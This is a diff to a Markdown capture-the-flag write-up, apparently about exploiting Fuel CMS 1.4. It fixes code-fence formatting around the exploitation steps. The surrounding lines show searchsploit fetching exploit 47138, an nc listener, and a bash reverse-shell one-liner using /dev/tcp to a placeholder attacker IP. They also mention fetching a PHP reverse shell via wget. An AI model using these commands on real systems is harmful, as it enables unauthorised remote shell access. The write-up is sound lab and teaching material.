@@ -64,7 +64,7 @@ In the same time, I checked if an exploit for Fuel CMS 1.4 exists. I found this 
 $ searchsploit fuel cms
 [...]
 $ searchsploit -m 47138
-```
+
 
 I just delete the proxy variable and delete the proxy argument in the requests.get.
 
@@ -89,9 +89,9 @@ systemuid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 We can try to send a command to set up a reverse shell. Don't forget to set a nc listener ( example : $ nc -lnvp 4444).
 
-```bash
+``̀`bash
 cmd:"bash -c 'exec bash -i &>/dev/tcp/<my_ip>/<listener_port> <&1'"
-``̀
+`
 
 That does not works. So let's try to set up a webserver on local and execute a wget command from the target to my machine for get a php reverse shell file.
 
